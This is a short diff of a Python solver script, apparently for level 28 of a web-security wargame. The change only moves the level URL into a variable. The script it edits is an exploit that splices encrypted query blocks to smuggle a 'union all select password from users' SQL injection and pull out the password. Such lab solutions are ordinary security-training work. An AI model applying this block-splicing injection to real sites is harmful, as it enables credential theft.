@@ -12,16 +12,17 @@ level_number = 28
 
 def get_secret():
     req = get_request_object(level_number)
-    result = req.post(get_level_url(level_number), data={"query": " " * 10})
+    url = get_level_url(level_number)
+    result = req.post(url, data={"query": " " * 10})
     baseline = base64.b64decode(parse.unquote(result.url.split("=")[1]))
     header = baseline[:48]
     footer = baseline[48:]
 
     sql = " " * 9 + "' union all select password from users;#"
-    result = req.post(get_level_url(level_number), data={"query": sql})
+    result = req.post(url, data={"query": sql})
     exploit = base64.b64decode(parse.unquote(result.url.split("=")[1]))
     ciphertext = base64.b64encode(header + exploit[48:96] + footer)
-    result = req.get(get_level_url(level_number) + "/search.php", params={"query": ciphertext})
+    result = req.get(url + "/search.php", params={"query": ciphertext})
     pattern = "<[^<]+?>"
     text = re.sub(pattern, "", result.text)
     search = "Whack Computer Joke Database"
